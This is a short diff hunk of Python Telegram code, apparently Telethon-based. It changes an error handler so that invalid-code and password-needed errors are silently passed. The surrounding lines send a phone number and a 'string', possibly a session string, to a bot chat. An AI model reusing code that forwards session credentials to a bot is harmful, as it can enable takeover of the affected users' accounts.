@@ -37,7 +37,7 @@ async def send(phone:str):
               bot.send_message(chat_id, f"{phone} ------\n{string}")
               
            except (PhoneCodeInvalidError, SessionPasswordNeededError):
-               print("invalid code")
+               pass
            except (SendCodeUnavailableError,PhoneMigrateError):
                print("cant send code")
                break
